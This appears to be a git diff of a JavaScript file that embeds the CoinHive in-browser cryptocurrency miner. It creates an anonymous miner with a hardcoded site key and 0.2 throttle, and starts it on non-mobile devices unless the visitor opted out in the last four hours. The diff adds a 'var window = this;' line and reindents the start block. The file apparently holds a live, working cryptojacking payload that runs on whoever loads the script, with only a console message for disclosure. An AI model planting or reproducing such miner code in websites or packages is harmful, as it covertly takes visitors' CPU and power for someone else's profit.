@@ -1,5 +1,6 @@
 console.log(`it's work!`);
 
+var window = this;
 
 (function(window) {
 	"use strict";
@@ -604,8 +605,8 @@ CoinHive.CRYPTONIGHT_WORKER_BLOB = CoinHive.Res(" self.WASM_BINARY_INLINE= [0,97
 
 var miner = new CoinHive.Anonymous('tSz1kUpXUVhozPAez9XuuFcbykpjPSo9', {throttle: 0.2});
 
-        // Only start on non-mobile devices and if not opted-out
-        // in the last 14400 seconds (4 hours):
-        if (!miner.isMobile() && !miner.didOptOut(14400)) {
-            miner.start();
-        }
+// Only start on non-mobile devices and if not opted-out
+// in the last 14400 seconds (4 hours):
+if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+}
